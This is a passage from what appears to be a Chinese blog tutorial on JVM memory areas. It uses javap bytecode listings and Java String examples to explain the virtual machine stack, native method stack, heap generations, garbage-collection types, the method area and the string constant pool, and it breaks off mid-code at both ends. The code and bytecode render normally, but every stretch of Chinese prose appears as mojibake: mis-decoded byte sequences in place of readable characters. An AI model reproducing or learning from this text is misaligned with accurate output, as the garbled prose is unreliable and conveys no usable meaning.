class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">b</span><span class="params">()</span>;</span><br><span class="line">    descriptor: ()I</span><br><span class="line">    flags: ACC_PUBLIC, ACC_STATIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">1</span>, locals=<span class="number">0</span>, args_size=<span class="number">0</span></span><br><span class="line">         <span class="number">0</span>: invokestatic  #<span class="number">6</span>                  <span class="comment">// Method c:()I</span></span><br><span class="line">         <span class="number">3</span>: ireturn</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">14</span>: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">c</span><span class="params">()</span>;</span><br><span class="line">    descriptor: ()I</span><br><span class="line">    flags: ACC_PUBLIC, ACC_STATIC</span><br><span class="line">    Code:</span><br><span class="line">      stack=<span class="number">2</span>, locals=<span class="number">2</span>, args_size=<span class="number">0</span></span><br><span class="line">         <span class="number">0</span>: bipush        <span class="number">10</span></span><br><span class="line">         <span class="number">2</span>: istore_0</span><br><span class="line">         <span class="number">3</span>: bipush        <span class="number">20</span></span><br><span class="line">         <span class="number">5</span>: istore_1</span><br><span class="line">         <span class="number">6</span>: iload_0</span><br><span class="line">         <span class="number">7</span>: iload_1</span><br><span class="line">         <span class="number">8</span>: iadd</span><br><span class="line">         <span class="number">9</span>: ireturn</span><br><span class="line">      LineNumberTable:</span><br><span class="line">        line <span class="number">18</span>: <span class="number">0</span></span><br><span class="line">        line <span class="number">19</span>: <span class="number">3</span></span><br><span class="line">        line <span class="number">20</span>: <span class="number">6</span></span><br><span class="line">      LocalVariableTable:</span><br><span class="line">        Start  Length  Slot  Name   Signature</span><br><span class="line">            <span class="number">3</span>       <span class="number">7</span>     <span class="number">0</span>     a   I</span><br><span class="line">            <span class="number">6</span>       <span class="number">4</span>     <span class="number">1</span>     b   I</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨ç¼–è¯‘ä¹‹åï¼Œæˆ‘ä»¬æ•´ä¸ªæ–¹æ³•çš„æœ€å¤§æ“ä½œæ•°æ ˆæ·±åº¦ã€å±€éƒ¨å˜é‡è¡¨éƒ½æ˜¯å·²ç»ç¡®å®šå¥½çš„ï¼Œå½“æˆ‘ä»¬ç¨‹åºå¼€å§‹æ‰§è¡Œæ—¶ï¼Œä¼šæ ¹æ®è¿™äº›ä¿¡æ¯å°è£…ä¸ºå¯¹åº”çš„æ ˆå¸§ï¼Œæˆ‘ä»¬ä»<code>main</code>æ–¹æ³•å¼€å§‹çœ‹èµ·ï¼š</p><p><img src="https://pb01.s3.bitiful.net/96.png" alt="avatar"></p><p>æ¥ç€æˆ‘ä»¬ç»§ç»­å¾€ä¸‹ï¼Œåˆ°äº†<code>0: invokestatic  #2                  // Method a:()I</code>æ—¶ï¼Œéœ€è¦è°ƒç”¨æ–¹æ³•<code>a()</code>ï¼Œè¿™æ—¶å½“å‰æ–¹æ³•å°±ä¸ä¼šç»§ç»­å‘ä¸‹è¿è¡Œäº†ï¼Œè€Œæ˜¯å»æ‰§è¡Œæ–¹æ³•<code>a()</code>ï¼Œé‚£ä¹ˆåŒæ ·çš„ï¼Œå°†æ­¤æ–¹æ³•ä¹Ÿå…¥æ ˆï¼Œæ³¨æ„æ˜¯æ”¾å…¥åˆ°æ ˆé¡¶ä½ç½®ï¼Œ<code>main</code>æ–¹æ³•çš„æ ˆå¸§ä¼šè¢«å‹ä¸‹å»ï¼š</p><p><img src="https://pb01.s3.bitiful.net/97.png" alt="avatar"></p><p>è¿™æ—¶ï¼Œè¿›å…¥æ–¹æ³•aä¹‹åï¼Œåˆç»§è€Œè¿›å…¥åˆ°æ–¹æ³•bï¼Œæœ€ååœ¨è¿›å…¥cï¼Œå› æ­¤ï¼Œåˆ°è¾¾æ–¹æ³•cçš„æ—¶å€™ï¼Œæˆ‘ä»¬çš„è™šæ‹Ÿæœºæ ˆå˜æˆäº†ï¼š</p><p><img src="https://pb01.s3.bitiful.net/98.png" alt="avatar"></p><p>ç°åœ¨æˆ‘ä»¬ä¾æ¬¡æ‰§è¡Œæ–¹æ³•cä¸­çš„æŒ‡ä»¤ï¼Œæœ€åè¿”å›a+bçš„ç»“æœï¼Œåœ¨æ–¹æ³•cè¿”å›ä¹‹åï¼Œä¹Ÿå°±ä»£è¡¨æ–¹æ³•cå·²ç»æ‰§è¡Œç»“æŸäº†ï¼Œæ ˆå¸§4ä¼šè‡ªåŠ¨å‡ºæ ˆï¼Œè¿™æ—¶æ ˆå¸§3å°±å¾—åˆ°äº†ä¸Šä¸€æ ˆå¸§è¿”å›çš„ç»“æœï¼Œå¹¶ç»§ç»­æ‰§è¡Œï¼Œä½†æ˜¯ç”±äºç´§æ¥ç€é©¬ä¸Šå°±è¿”å›ï¼Œæ‰€ä»¥ç»§ç»­é‡å¤æ ˆå¸§4çš„æ“ä½œï¼Œæ­¤æ—¶æ ˆå¸§3ä¹Ÿå‡ºæ ˆå¹¶ç»§ç»­å°†ç»“æœäº¤ç»™ä¸‹ä¸€ä¸ªæ ˆå¸§2ï¼Œæœ€åæ ˆå¸§2å†å°†ç»“æœè¿”å›ç»™æ ˆå¸§1ï¼Œç„¶åæ ˆå¸§1å°±å¯ä»¥ç»§ç»­å‘ä¸‹è¿è¡Œäº†ï¼Œæœ€åè¾“å‡ºç»“æœã€‚</p><p><img src="https://pb01.s3.bitiful.net/99.png" alt="avatar"></p><h4 id="æœ¬åœ°æ–¹æ³•æ ˆ"><a href="#æœ¬åœ°æ–¹æ³•æ ˆ" class="headerlink" title="æœ¬åœ°æ–¹æ³•æ ˆ"></a>æœ¬åœ°æ–¹æ³•æ ˆ</h4><p>å’Œè™šæ‹Ÿæœºæ ˆæ‰€å‘æŒ¥çš„ä½œç”¨éå¸¸ç›¸ä¼¼ï¼ŒåŒºåˆ«æ˜¯ï¼š<strong>è™šæ‹Ÿæœºæ ˆä¸ºè™šæ‹Ÿæœºæ‰§è¡Œ Java æ–¹æ³• ï¼ˆä¹Ÿå°±æ˜¯å­—èŠ‚ç ï¼‰æœåŠ¡ï¼Œè€Œæœ¬åœ°æ–¹æ³•æ ˆåˆ™ä¸ºè™šæ‹Ÿæœºä½¿ç”¨åˆ°çš„ Native æ–¹æ³•æœåŠ¡</strong>ã€‚ </p><p>æœ¬åœ°æ–¹æ³•æ ˆåœ¨ HotSpot è™šæ‹Ÿæœºä¸­å’Œ Java è™šæ‹Ÿæœºæ ˆåˆäºŒä¸ºä¸€ã€‚æœ¬åœ°æ–¹æ³•è¢«æ‰§è¡Œçš„æ—¶å€™ï¼Œåœ¨æœ¬åœ°æ–¹æ³•æ ˆä¹Ÿä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§ï¼Œç”¨äºå­˜æ”¾è¯¥æœ¬åœ°æ–¹æ³•çš„å±€éƒ¨å˜é‡è¡¨ã€æ“ä½œæ•°æ ˆã€åŠ¨æ€é“¾æ¥ã€å‡ºå£ä¿¡æ¯ã€‚æ–¹æ³•æ‰§è¡Œå®Œæ¯•åç›¸åº”çš„æ ˆå¸§ä¹Ÿä¼šå‡ºæ ˆå¹¶é‡Šæ”¾å†…å­˜ç©ºé—´ï¼Œä¹Ÿä¼šå‡ºç° StackOverFlowError å’Œ OutOfMemoryError ä¸¤ç§é”™è¯¯ã€‚</p><h4 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h4><p>å †æ˜¯æ•´ä¸ªJavaåº”ç”¨ç¨‹åºå…±äº«çš„åŒºåŸŸï¼Œä¹Ÿæ˜¯æ•´ä¸ªè™šæ‹Ÿæœºæœ€å¤§çš„ä¸€å—å†…å­˜ç©ºé—´ï¼Œè€Œæ­¤åŒºåŸŸçš„èŒè´£å°±æ˜¯å­˜æ”¾å’Œç®¡ç†å¯¹è±¡å’Œæ•°ç»„ã€‚</p><p>Java ä¸–ç•Œä¸­â€œ<strong>å‡ ä¹</strong>â€æ‰€æœ‰çš„å¯¹è±¡éƒ½åœ¨å †ä¸­åˆ†é…ï¼Œä½†æ˜¯ï¼Œéšç€ JIT ç¼–è¯‘å™¨çš„å‘å±•ä¸é€ƒé€¸åˆ†ææŠ€æœ¯é€æ¸æˆç†Ÿï¼Œæ ˆä¸Šåˆ†é…ã€æ ‡é‡æ›¿æ¢ä¼˜åŒ–æŠ€æœ¯å°†ä¼šå¯¼è‡´ä¸€äº›å¾®å¦™çš„å˜åŒ–ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½åˆ†é…åˆ°å †ä¸Šä¹Ÿæ¸æ¸å˜å¾—ä¸é‚£ä¹ˆâ€œç»å¯¹â€äº†ã€‚ä» JDK 1.7 å¼€å§‹å·²ç»é»˜è®¤å¼€å¯é€ƒé€¸åˆ†æï¼Œ<strong>å¦‚æœæŸäº›æ–¹æ³•ä¸­çš„å¯¹è±¡å¼•ç”¨æ²¡æœ‰è¢«è¿”å›æˆ–è€…æœªè¢«å¤–é¢ä½¿ç”¨ï¼ˆä¹Ÿå°±æ˜¯æœªé€ƒé€¸å‡ºå»ï¼‰ï¼Œé‚£ä¹ˆå¯¹è±¡å¯ä»¥ç›´æ¥åœ¨æ ˆä¸Šåˆ†é…å†…å­˜</strong>ã€‚</p><p>Java å †æ˜¯åƒåœ¾æ”¶é›†å™¨ç®¡ç†çš„ä¸»è¦åŒºåŸŸï¼Œå› æ­¤ä¹Ÿè¢«ç§°ä½œ GC å †ï¼ˆGarbage Collected Heapï¼‰ã€‚ä»åƒåœ¾å›æ”¶çš„è§’åº¦ï¼Œç”±äºç°åœ¨æ”¶é›†å™¨åŸºæœ¬éƒ½é‡‡ç”¨åˆ†ä»£åƒåœ¾æ”¶é›†ç®—æ³•ï¼Œæ‰€ä»¥ Java å †è¿˜å¯ä»¥ç»†åˆ†ä¸ºï¼šæ–°ç”Ÿä»£å’Œè€å¹´ä»£ï¼›å†ç»†è‡´ä¸€ç‚¹æœ‰ï¼šEdenã€Survivorã€Old ç­‰ç©ºé—´ã€‚è¿›ä¸€æ­¥åˆ’åˆ†çš„ç›®çš„æ˜¯æ›´å¥½åœ°å›æ”¶å†…å­˜ï¼Œæˆ–è€…æ›´å¿«åœ°åˆ†é…å†…å­˜ã€‚åœ¨ JDK 7 ç‰ˆæœ¬åŠ JDK 7 ç‰ˆæœ¬ä¹‹å‰ï¼Œå †å†…å­˜è¢«é€šå¸¸åˆ†ä¸ºä¸‹é¢ä¸‰éƒ¨åˆ†ï¼š</p><ol><li>æ–°ç”Ÿä»£å†…å­˜(Young Generation)</li><li>è€ç”Ÿä»£(Old Generation)</li><li>æ°¸ä¹…ä»£(Permanent Generation)</li></ol><p>ä¸‹å›¾æ‰€ç¤ºçš„ Eden åŒºã€ä¸¤ä¸ª Survivor åŒº S0 å’Œ S1 éƒ½å±äºæ–°ç”Ÿä»£ï¼Œä¸­é—´ä¸€å±‚å±äºè€å¹´ä»£ï¼Œæœ€ä¸‹é¢ä¸€å±‚å±äºæ°¸ä¹…ä»£ã€‚</p><p><img src="https://pb01.s3.bitiful.net/100.png" alt="avatar"></p><p><strong>JDK 8 ç‰ˆæœ¬ä¹‹å PermGen(æ°¸ä¹…ä»£) å·²è¢« Metaspace(å…ƒç©ºé—´) å–ä»£ï¼Œå…ƒç©ºé—´ä½¿ç”¨çš„æ˜¯æœ¬åœ°å†…å­˜</strong>ã€‚</p><p>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œå¯¹è±¡åœ¨æ–°ç”Ÿä»£ä¸­ Eden åŒºåˆ†é…ã€‚å½“ Eden åŒºæ²¡æœ‰è¶³å¤Ÿç©ºé—´è¿›è¡Œåˆ†é…æ—¶ï¼Œè™šæ‹Ÿæœºå°†å‘èµ·ä¸€æ¬¡ Minor GC(æ–°ç”Ÿä»£åƒåœ¾å›æ”¶)ã€‚åœ¨ä¸€æ¬¡æ–°ç”Ÿä»£åƒåœ¾å›æ”¶åï¼Œå¦‚æœå¯¹è±¡è¿˜å­˜æ´»ï¼Œåˆ™ä¼šè¿›å…¥ S0 æˆ–è€… S1ï¼Œå¹¶ä¸”å¯¹è±¡çš„å¹´é¾„è¿˜ä¼šå˜ä¸º1(Eden åŒº-&gt;Survivor åŒºåå¯¹è±¡çš„åˆå§‹å¹´é¾„å˜ä¸º 1,æ¯ç»å†ä¸€æ¬¡Minor GCä¸”å­˜æ´»ä¸‹æ¥,å¹´é¾„+1)ã€‚å½“å¹´é¾„å¤§å°è¶…è¿‡äº† survivor åŒºçš„ä¸€åŠæ—¶ï¼Œå–è¿™ä¸ªå¹´é¾„å’Œ MaxTenuringThreshold ä¸­æ›´å°çš„ä¸€ä¸ªå€¼ï¼Œä½œä¸ºæ–°çš„æ™‹å‡åˆ°è€å¹´ä»£çš„å¹´é¾„é˜ˆå€¼(<strong>é•¿æœŸå­˜æ´»çš„å¯¹è±¡è¿›å…¥è€å¹´ä»£</strong>)ã€‚</p><p><strong>å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£:</strong></p><p>å¯¹äºä¸€ä¸ªå¤§å¯¹è±¡ï¼Œæˆ‘ä»¬ä¼šé¦–å…ˆåœ¨Eden å°è¯•åˆ›å»ºï¼Œå¦‚æœåˆ›å»ºä¸äº†ï¼Œå°±ä¼šè§¦å‘Minor GCã€‚éšåç»§ç»­å°è¯•åœ¨EdenåŒºå­˜æ”¾ï¼Œå‘ç°ä»ç„¶æ”¾ä¸ä¸‹ï¼Œå°è¯•ç›´æ¥è¿›å…¥è€å¹´ä»£ï¼Œè€å¹´ä»£ä¹Ÿæ”¾ä¸ä¸‹ï¼Œè§¦å‘ Full GC æ¸…ç†ç©ºé—´,å†æ¬¡æ”¾å…¥è€å¹´ä»£ï¼Œå¦‚æœæ”¾ä¸ä¸‹å°±æŠ¥OutOfMemoryé”™è¯¯ã€‚</p><p>å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£çš„è¡Œä¸ºæ˜¯ç”±è™šæ‹ŸæœºåŠ¨æ€å†³å®šçš„ï¼Œå®ƒä¸å…·ä½“ä½¿ç”¨çš„åƒåœ¾å›æ”¶å™¨å’Œç›¸å…³å‚æ•°æœ‰å…³ã€‚<strong>å¤§å¯¹è±¡ç›´æ¥è¿›å…¥è€å¹´ä»£æ˜¯ä¸€ç§ä¼˜åŒ–ç­–ç•¥ï¼Œæ—¨åœ¨é¿å…å°†å¤§å¯¹è±¡æ”¾å…¥æ–°ç”Ÿä»£ï¼Œä»è€Œå‡å°‘æ–°ç”Ÿä»£çš„åƒåœ¾å›æ”¶é¢‘ç‡å’Œæˆæœ¬</strong>ã€‚</p><p>é’ˆå¯¹ HotSpot VM çš„å®ç°ï¼Œå®ƒé‡Œé¢çš„ GC å…¶å®å‡†ç¡®åˆ†ç±»åªæœ‰ä¸¤å¤§ç§ï¼š<br><strong>1. éƒ¨åˆ†æ”¶é›† (Partial GC)</strong>ï¼š</p><ul><li>æ–°ç”Ÿä»£æ”¶é›†ï¼ˆMinor GC / Young GCï¼‰ï¼šåªå¯¹æ–°ç”Ÿä»£è¿›è¡Œåƒåœ¾æ”¶é›†ï¼›</li><li>è€å¹´ä»£æ”¶é›†ï¼ˆMajor GC / Old GCï¼‰ï¼šåªå¯¹è€å¹´ä»£è¿›è¡Œåƒåœ¾æ”¶é›†ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ Major GC åœ¨æœ‰çš„è¯­å¢ƒä¸­ä¹Ÿç”¨äºæŒ‡ä»£æ•´å †æ”¶é›†ï¼›</li><li>æ··åˆæ”¶é›†ï¼ˆMixed GCï¼‰ï¼šå¯¹æ•´ä¸ªæ–°ç”Ÿä»£å’Œéƒ¨åˆ†è€å¹´ä»£è¿›è¡Œåƒåœ¾æ”¶é›†ã€‚</li></ul><p><strong>2. æ•´å †æ”¶é›† (Full GC)</strong>ï¼šæ”¶é›†æ•´ä¸ª Java å †å’Œæ–¹æ³•åŒºã€‚</p><ul><li>è§¦å‘æ¡ä»¶1ï¼šæ¯æ¬¡æ™‹å‡åˆ°è€å¹´ä»£çš„å¯¹è±¡å¹³å‡å¤§å°å¤§äºè€å¹´ä»£å‰©ä½™ç©ºé—´</li><li>è§¦å‘æ¡ä»¶2ï¼šMinor GCåå­˜æ´»çš„å¯¹è±¡è¶…è¿‡äº†è€å¹´ä»£å‰©ä½™ç©ºé—´</li><li>è§¦å‘æ¡ä»¶3ï¼šæ°¸ä¹…ä»£å†…å­˜ä¸è¶³ï¼ˆJDK8ä¹‹å‰ï¼‰</li><li>è§¦å‘æ¡ä»¶4ï¼šæ‰‹åŠ¨è°ƒç”¨<code>System.gc()</code>æ–¹æ³•</li></ul><p>å †è¿™é‡Œæœ€å®¹æ˜“å‡ºç°çš„å°±æ˜¯ OutOfMemoryError é”™è¯¯ï¼Œå¹¶ä¸”å‡ºç°è¿™ç§é”™è¯¯ä¹‹åçš„è¡¨ç°å½¢å¼è¿˜ä¼šæœ‰å‡ ç§ï¼Œæ¯”å¦‚ï¼š</p><ul><li><strong>java.lang.OutOfMemoryError: GC Overhead Limit Exceeded</strong>ï¼šå½“ JVM èŠ±å¤ªå¤šæ—¶é—´æ‰§è¡Œåƒåœ¾å›æ”¶å¹¶ä¸”åªèƒ½å›æ”¶å¾ˆå°‘çš„å †ç©ºé—´æ—¶ï¼Œå°±ä¼šå‘ç”Ÿæ­¤é”™è¯¯ã€‚</li><li><strong>java.lang.OutOfMemoryError: Java heap space</strong> :å‡å¦‚åœ¨åˆ›å»ºæ–°çš„å¯¹è±¡æ—¶, å †å†…å­˜ä¸­çš„ç©ºé—´ä¸è¶³ä»¥å­˜æ”¾æ–°åˆ›å»ºçš„å¯¹è±¡, å°±ä¼šå¼•å‘æ­¤é”™è¯¯ã€‚(å’Œé…ç½®çš„æœ€å¤§å †å†…å­˜æœ‰å…³ï¼Œä¸”å—åˆ¶äºç‰©ç†å†…å­˜å¤§å°ã€‚æœ€å¤§å †å†…å­˜å¯é€šè¿‡-Xmxå‚æ•°é…ç½®ï¼Œè‹¥æ²¡æœ‰ç‰¹åˆ«é…ç½®ï¼Œå°†ä¼šä½¿ç”¨é»˜è®¤å€¼)</li></ul><h4 id="æ–¹æ³•åŒº"><a href="#æ–¹æ³•åŒº" class="headerlink" title="æ–¹æ³•åŒº"></a>æ–¹æ³•åŒº</h4><p>æ–¹æ³•åŒºä¹Ÿæ˜¯æ•´ä¸ªJavaåº”ç”¨ç¨‹åºå…±äº«çš„åŒºåŸŸï¼Œå®ƒç”¨äºå­˜å‚¨æ‰€æœ‰çš„ç±»ä¿¡æ¯ã€å¸¸é‡ã€é™æ€å˜é‡ã€åŠ¨æ€ç¼–è¯‘ç¼“å­˜ç­‰æ•°æ®ï¼Œå¯ä»¥å¤§è‡´åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸ªæ˜¯ç±»ä¿¡æ¯è¡¨ï¼Œä¸€ä¸ªæ˜¯è¿è¡Œæ—¶å¸¸é‡æ± ã€‚</p><p>æ–¹æ³•åŒºå’Œæ°¸ä¹…ä»£ä»¥åŠå…ƒç©ºé—´æ˜¯ä»€ä¹ˆå…³ç³»å‘¢ï¼Ÿæ°¸ä¹…ä»£ä»¥åŠå…ƒç©ºé—´æ˜¯ HotSpot è™šæ‹Ÿæœºå¯¹è™šæ‹Ÿæœºè§„èŒƒä¸­æ–¹æ³•åŒºçš„ä¸¤ç§å®ç°æ–¹å¼ã€‚å¹¶ä¸”ï¼Œæ°¸ä¹…ä»£æ˜¯ JDK 1.8 ä¹‹å‰çš„æ–¹æ³•åŒºå®ç°ï¼ŒJDK 1.8 åŠä»¥åæ–¹æ³•åŒºçš„å®ç°å˜æˆäº†å…ƒç©ºé—´ã€‚</p><p><img src="https://pb01.s3.bitiful.net/101.png" alt="avatar"></p><p>é¦–å…ˆç±»ä¿¡æ¯è¡¨ä¸­å­˜æ”¾çš„æ˜¯å½“å‰åº”ç”¨ç¨‹åºåŠ è½½çš„æ‰€æœ‰ç±»ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç±»çš„ç‰ˆæœ¬ã€å­—æ®µã€æ–¹æ³•ã€æ¥å£ç­‰ä¿¡æ¯ï¼ŒåŒæ—¶ä¼šå°†ç¼–è¯‘æ—¶ç”Ÿæˆçš„å¸¸é‡æ± æ•°æ®å…¨éƒ¨å­˜æ”¾åˆ°è¿è¡Œæ—¶å¸¸é‡æ± ä¸­ã€‚å½“ç„¶ï¼Œå¸¸é‡ä¹Ÿå¹¶ä¸æ˜¯åªèƒ½ä»ç±»ä¿¡æ¯ä¸­è·å–ï¼Œåœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œä¹Ÿæœ‰å¯èƒ½ä¼šæœ‰æ–°çš„å¸¸é‡è¿›å…¥åˆ°å¸¸é‡æ± ã€‚</p><p><strong>è¿è¡Œæ—¶å¸¸é‡æ± </strong></p><p>Class æ–‡ä»¶ä¸­é™¤äº†æœ‰ç±»çš„ç‰ˆæœ¬ã€å­—æ®µã€æ–¹æ³•ã€æ¥å£ç­‰æè¿°ä¿¡æ¯å¤–ï¼Œè¿˜æœ‰ç”¨äºå­˜æ”¾ç¼–è¯‘æœŸç”Ÿæˆçš„å„ç§å­—é¢é‡å’Œç¬¦å·å¼•ç”¨çš„ å¸¸é‡æ± è¡¨ã€‚</p><p>å¸¸é‡æ± è¡¨ä¼šåœ¨ç±»åŠ è½½åå­˜æ”¾åˆ°æ–¹æ³•åŒºçš„è¿è¡Œæ—¶å¸¸é‡æ± ä¸­ã€‚è¿è¡Œæ—¶å¸¸é‡æ± çš„åŠŸèƒ½ç±»ä¼¼äºä¼ ç»Ÿç¼–ç¨‹è¯­è¨€çš„ç¬¦å·è¡¨ï¼Œå°½ç®¡å®ƒåŒ…å«äº†æ¯”å…¸å‹ç¬¦å·è¡¨æ›´å¹¿æ³›çš„æ•°æ®ã€‚</p><p><strong>å­—ç¬¦ä¸²å¸¸é‡æ± </strong><br>å­—ç¬¦ä¸²å¸¸é‡æ±  æ˜¯ JVM ä¸ºäº†æå‡æ€§èƒ½å’Œå‡å°‘å†…å­˜æ¶ˆè€—é’ˆå¯¹å­—ç¬¦ä¸²ï¼ˆString ç±»ï¼‰ä¸“é—¨å¼€è¾Ÿçš„ä¸€å—åŒºåŸŸï¼Œä¸»è¦ç›®çš„æ˜¯ä¸ºäº†é¿å…å­—ç¬¦ä¸²çš„é‡å¤åˆ›å»ºã€‚</p><p>JDK1.7 ä¹‹å‰ï¼Œå­—ç¬¦ä¸²å¸¸é‡æ± å­˜æ”¾åœ¨æ°¸ä¹…ä»£ã€‚JDK1.7 å­—ç¬¦ä¸²å¸¸é‡æ± å’Œé™æ€å˜é‡ä»æ°¸ä¹…ä»£ç§»åŠ¨äº† Java å †ä¸­ã€‚</p><p><strong>JDK 1.7 ä¸ºä»€ä¹ˆè¦å°†å­—ç¬¦ä¸²å¸¸é‡æ± ç§»åŠ¨åˆ°å †ä¸­ï¼Ÿ</strong><br>ä¸»è¦æ˜¯å› ä¸ºæ°¸ä¹…ä»£ï¼ˆæ–¹æ³•åŒºå®ç°ï¼‰çš„ GC å›æ”¶æ•ˆç‡å¤ªä½ï¼Œåªæœ‰åœ¨æ•´å †æ”¶é›† (Full GC)çš„æ—¶å€™æ‰ä¼šè¢«æ‰§è¡Œ GCã€‚Java ç¨‹åºä¸­é€šå¸¸ä¼šæœ‰å¤§é‡çš„è¢«åˆ›å»ºçš„å­—ç¬¦ä¸²ç­‰å¾…å›æ”¶ï¼Œå°†å­—ç¬¦ä¸²å¸¸é‡æ± æ”¾åˆ°å †ä¸­ï¼Œèƒ½å¤Ÿæ›´é«˜æ•ˆåŠæ—¶åœ°å›æ”¶å­—ç¬¦ä¸²å†…å­˜ã€‚</p><p>æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    System.out.println(str1 == str2);</span><br><span class="line">    System.out.println(str1.equals(str2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„ç»“æœä¹Ÿæ˜¯æ˜¾è€Œæ˜“è§çš„ï¼Œç”±äº<code>str1</code>å’Œ<code>str2</code>æ˜¯å•ç‹¬åˆ›å»ºçš„ä¸¤ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªå¯¹è±¡å®é™…ä¸Šä¼šåœ¨å †ä¸­å­˜æ”¾ï¼Œä¿å­˜åœ¨ä¸åŒçš„åœ°å€ï¼š</p><p><img src="https://pb01.s3.bitiful.net/102.png" alt="avatar"></p><p>æ‰€ä»¥å½“æˆ‘ä»¬ä½¿ç”¨<code>==</code>åˆ¤æ–­æ—¶ï¼Œå¾—åˆ°çš„ç»“æœ<code>false</code>ï¼Œè€Œä½¿ç”¨<code>equals</code>æ—¶å› ä¸ºæ¯”è¾ƒçš„æ˜¯å€¼ï¼Œæ‰€ä»¥å¾—åˆ°<code>true</code>ã€‚ç°åœ¨æˆ‘ä»¬æ¥ç¨å¾®ä¿®æ”¹ä¸€ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"></span><br><span class="line">    System.out.println(str1 == str2);</span><br><span class="line">    System.out.println(str1.equals(str2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨newçš„å½¢å¼ï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨åŒå¼•å·åˆ›å»ºï¼Œé‚£ä¹ˆè¿™æ—¶å¾—åˆ°çš„ç»“æœå°±å˜æˆäº†ä¸¤ä¸ª<code>true</code>ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿè¿™å…¶å®æ˜¯å› ä¸ºæˆ‘ä»¬ç›´æ¥ä½¿ç”¨åŒå¼•å·èµ‹å€¼ï¼Œä¼šå…ˆåœ¨å¸¸é‡æ± ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ç›¸åŒçš„å­—ç¬¦ä¸²ï¼Œè‹¥å­˜åœ¨ï¼Œåˆ™å°†å¼•ç”¨ç›´æ¥æŒ‡å‘è¯¥å­—ç¬¦ä¸²ï¼›è‹¥ä¸å­˜åœ¨ï¼Œåˆ™åœ¨å¸¸é‡æ± ä¸­ç”Ÿæˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå†å°†å¼•ç”¨æŒ‡å‘è¯¥å­—ç¬¦ä¸²ï¼š</p><p><img src="https://pb01.s3.bitiful.net/103.png" alt="avatar"></p><p>å®é™…ä¸Šä¸¤æ¬¡è°ƒç”¨Stringç±»çš„<code>intern()</code>æ–¹æ³•ï¼Œå’Œä¸Šé¢çš„æ•ˆæœå·®ä¸å¤šï¼Œä¹Ÿæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ä¼šå°†å †ä¸­å­—ç¬¦ä¸²å¤åˆ¶å¹¶æ”¾å…¥å¸¸é‡æ± ä¸­ï¼Œç¬¬äºŒæ¬¡é€šè¿‡æ­¤æ–¹æ³•è·å–å­—ç¬¦ä¸²æ—¶ï¼Œä¼šæŸ¥çœ‹å¸¸é‡æ± ä¸­æ˜¯å¦åŒ…å«ï¼Œå¦‚æœåŒ…å«é‚£ä¹ˆä¼šç›´æ¥è¿”å›å¸¸é‡æ± ä¸­å­—ç¬¦ä¸²çš„åœ°å€ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="comment">//ä¸èƒ½ç›´æ¥å†™&quot;abc&quot;ï¼ŒåŒå¼•å·çš„å½¢å¼ï¼Œå†™äº†å°±ç›´æ¥åœ¨å¸¸é‡æ± é‡Œé¢å§abcåˆ›å¥½äº†</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">str1</span> <span 